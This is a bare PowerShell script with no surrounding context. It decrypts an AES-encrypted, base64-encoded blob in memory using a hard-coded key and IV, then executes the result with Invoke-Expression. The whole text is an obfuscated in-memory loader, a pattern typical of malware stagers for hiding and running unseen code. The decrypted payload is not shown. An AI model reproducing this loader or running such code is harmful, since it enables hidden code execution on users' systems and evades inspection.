$key = [System.Text.Encoding]::UTF8.GetBytes("PhantomKey1234567890123456789012")
$iv = [System.Text.Encoding]::UTF8.GetBytes("1234567890123456")
$enc = "rZWLNLcpuMnGExephNEDAeqtl3Ef/Xx3oYUihu5cMvV/vDt/3A1b6rauTffGeL7uNyUPkUzngszbz7PqqzZJ0nzSYKVzMcSR+6aX3ABEFSZySUdRK5ri/vSkeiY05DlMjwThL6Axyf/bYQMuZTuzZhy90tIStvsAb/NW7w5coCeyddgfhXk6GwfNltcPWjZPrgslUxHTgFSAv3GNsXWVsSHNKLa4s0juT+IKbjaqz2hEZZ/xW621y6oD1kTaj3GU1+tA7q9Ki+DSRNJr5/qsa2IXmV6nCPucc73eLn24B7uBy5NvNx+FqZjOHAPQO6DjTBzRsapTORajeQG7iuqsKkwIqG8/GCazSZbmYmhBY+RTy0ObbuVLj93GHITyNelNGvH1cFMtjIpylF7n9wM+bIQzFpAWYmY8HSq0fuDEaf4jl/1Ey6799wIzE+XCHmdcz7O3jMWOM0j3TrjKvE+oEyXzLILd1SWAS7X6a5nfwUVVfJLaWLfocjGWLvUQENYTNcFSbFdjoOnIdaZp0/qDB0ZL1JC3hpN1jBarUAkpzeqhL/KKMIGoj0F6FCvZsLXnOPYSxQquBgtQMYzsgEgKdQRC2g0sDAzrMim+h1Drr+KKA+kurhBci3wd1YewG5oklyZmzUek5kWaikDEJTRSisEtO4MxC6vPBtMdn+Wq8Il2nPiIP8CVXvreKb2PdaDCc4cwGAG6iPxRms/RHRn4yIDzrigm+7k5sI9wAf7jKW+80EkSxwMNazRL0J3h9flW3XeRNcFYkCw+vzeqVuJkWK2esbUK6GPvdaNixCEcFr2nlITSFiUP7pPBGsto8ue5Y5IUqerEn1eAJzDEuGEpPetOev04z97wdbgmiOdRYmr88A66ogiGhgkHIvlLJFMYVJPH8jE27gqS9r3aQ0vej319pPnJNy0oBGoOe6wPeA/mh21EEBvN6+3Et7zJ10PIchlzZGSe9P30CynicmLySj7QjLO8BOsBU/5h8HK/nDc="
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $key; $aes.IV = $iv
$ms = New-Object System.IO.MemoryStream(,[Convert]::FromBase64String($enc))
$cs = New-Object System.Security.Cryptography.CryptoStream($ms, $aes.CreateDecryptor(), [System.Security.Cryptography.CryptoStreamMode]::Read)
$sr = New-Object System.IO.StreamReader($cs)
$decryptedScript = $sr.ReadToEnd()
$sr.Close();$cs.Close();$ms.Close()
IEX $decryptedScript
